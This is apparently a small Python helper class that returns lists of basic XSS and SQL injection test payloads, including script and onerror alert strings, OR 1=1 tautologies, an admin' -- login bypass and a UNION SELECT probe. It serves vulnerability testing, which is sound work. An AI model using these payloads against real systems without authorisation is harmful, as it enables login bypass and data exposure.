class PayloadGenerator:
    """
    Provides standard, educational payloads for basic vulnerability testing.
    """
    
    @staticmethod
    def get_xss_payloads():
        return [
            "<script>alert('XSS_TEST_SUCCESS')</script>",
            "\"><script>alert('XSS_TEST_SUCCESS')</script>",
            "<img src=x onerror=alert('XSS_TEST_SUCCESS')>"
        ]
        
    @staticmethod
    def get_sqli_payloads():
        return [
            "' OR '1'='1",
            "' OR 1=1 --",
            "\" OR \"1\"=\"1",
            "admin' --",
            "' UNION SELECT 1,2,3 --"
        ]
